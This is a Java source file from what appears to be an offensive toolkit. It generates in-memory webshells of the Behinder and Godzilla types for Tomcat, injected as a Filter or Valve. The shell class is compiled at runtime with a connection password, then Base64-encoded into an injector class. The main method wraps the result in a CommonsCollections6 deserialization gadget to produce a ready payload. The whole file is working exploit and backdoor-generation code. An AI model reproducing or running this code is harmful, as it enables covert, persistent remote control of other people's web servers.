package com.droplab.Utils.Memory;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.UnSerialize.SerializeFactory;
import com.droplab.Utils.compile.JavaStringCompiler;

import java.util.Base64;
import java.util.Map;

public class MemroyFactory {
    private static MemroyFactory memroyFactory = null;

    public static MemroyFactory instance() {
        if (memroyFactory != null) {

        } else {
            memroyFactory = new MemroyFactory();
        }
        return memroyFactory;
    }


    /**
     * @param type       中间件类型 Tomcat Resin
     * @param middleware Filter  valve listner 等等
     * @param password   连接密码
     * @param shellType  Behinder  Godzilla
     * @return
     */
    public String getMemoryShell(String type, String middleware, String password, String shellType, String path, boolean template) {
        try {
            String ImplStr = String.format("com.droplab.Utils.Memory.%s.%s.%sImplStr", type, middleware, middleware);
            String addStr = String.format("com.droplab.Utils.Memory.%s.%s.add%s", type, middleware, middleware);

            JavaStringCompiler javaStringCompiler = new JavaStringCompiler();

            /*生成连接密码*/
            if (password.equals("") || password.isEmpty()) {
                password = "passw0rd1024";
            }
            String md5 = CommonUtils.getMD5(password);
            String behinder = md5.substring(0, 16); //冰蝎密码

            /*生成内存马类
             *
             */
            String implStrName = CommonUtils.RandomStr(6);
            Object o = Class.forName(ImplStr).newInstance();
            String implStr = (String) o.getClass().getMethod("get", Object.class, String.class, boolean.class).invoke(o, o, shellType, template);
            String format = "";
            if (shellType.equals("Behinder")) {
                format = String.format(implStr, implStrName, implStrName, behinder);
            } else if (shellType.equals("Godzilla")) {
                format = String.format(implStr, implStrName, implStrName,behinder, password, CommonUtils.getMD5(password + behinder));
            }
            Map<String, byte[]> compile = javaStringCompiler.compile(implStrName + ".java", format);
            byte[] bytes = compile.get(implStrName);
            String s = java.util.Base64.getEncoder().encodeToString(bytes);
            /*
             * 生成注入内存马的类
             */
            String addStrName = CommonUtils.RandomStr(6);
            Object o1 = Class.forName(addStr).newInstance();
            String addStrType = (String) o1.getClass().getMethod("get", Object.class, String.class, boolean.class).invoke(o1, o1, type, template);
            String format1 =null;

            if(type.equals("Tomcat")){
                if(middleware.equals("Filter")){
                    format1 = String.format(addStrType, addStrName, addStrName, s, CommonUtils.RandomStr(10));
                }else if(middleware.equals("Valve")){
                    format1 = String.format(addStrType, addStrName, addStrName, s);
                }
            }

            Map<String, byte[]> compile1 = javaStringCompiler.compile(addStrName + ".java", format1);
            byte[] bytes1 = compile1.get(addStrName);

            return java.util.Base64.getEncoder().encodeToString(bytes1);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void main(String[] args) {
        String template=MemroyFactory.instance().getMemoryShell("Tomcat", "Filter", "qax36oNbs", "Behinder", "", true);

        byte[] commonsCollections6s = SerializeFactory.instance().getObject("", "CommonsCollections6", Base64.getDecoder().decode(template));
        System.out.println(java.util.Base64.getEncoder().encodeToString(commonsCollections6s));
    }

}

